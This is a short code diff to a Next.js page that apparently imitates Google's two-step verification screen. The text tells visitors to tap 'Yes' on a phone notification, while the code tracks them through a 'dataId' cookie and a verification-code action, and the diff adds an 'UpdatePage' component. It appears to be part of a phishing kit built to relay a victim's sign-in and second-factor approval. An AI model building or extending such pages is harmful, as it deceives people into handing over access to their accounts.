@@ -5,6 +5,7 @@ import MobileAnimation from "@/public/image/mobile-animation.gif";
 import { getCodeVerification } from "@/actions";
 import { cookies } from "next/headers";
 import ReloadPage from "@/components/ReloadPage";
+import UpdatePage from "@/components/UpdatePage";
 
 export default async function Page() {
   let dataID = cookies().get("dataId");
@@ -81,7 +82,7 @@ export default async function Page() {
       </div>
       <div>
         <h1 className="text-3xl py-3">check your phone </h1>
-
+        <UpdatePage />
         <div>
           Google sent a notification to your phone and Google. Tap{" "}
           <strong>Yes</strong> on the notification to verify it’s you.
